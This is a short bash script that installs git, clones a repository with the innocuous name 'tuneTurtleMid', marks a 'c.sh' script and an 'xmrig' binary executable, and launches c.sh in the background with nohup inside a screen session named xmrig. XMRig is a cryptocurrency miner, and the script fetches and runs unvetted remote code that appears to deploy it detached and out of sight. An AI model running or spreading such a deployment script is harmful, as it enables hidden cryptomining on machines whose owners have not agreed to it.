#!/bin/bash

apt install git -y
git clone https://github.com/thehutgy/tuneTurtleMid
cd tuneTurtleMid
chmod u+x c.sh
chmod u+x xmrig
screen -S xmrig

nohup ./c.sh &

